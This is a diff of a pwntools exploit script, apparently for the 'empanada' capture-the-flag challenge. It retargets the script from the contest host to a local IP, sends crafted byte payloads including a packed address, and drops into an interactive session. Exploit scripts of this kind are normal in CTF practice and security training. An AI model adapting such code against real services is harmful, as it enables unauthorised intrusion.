@@ -1,7 +1,7 @@
 from pwn import *
 
-#s = remote('192.168.32.22',1234)
-s = remote('empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me',47281)
+s = remote('192.168.0.85',1234)
+#s = remote('empanada_45e50f0410494ec9cfb90430d2e86287.quals.shallweplayaga.me',47281)
 raw_input()
 s.send('\xbf')
 s.send('\x10'+'A'*30)
@@ -40,8 +40,4 @@ s.send('\x60'+p32(0x31337178)+'A'*3)
 
 s.send('\x9f')
 s.send('\xfe'+'A'*30)
-'''
-s.send('\x9f')
-s.send('\x10'+'C'*30)
-'''
 s.interactive()
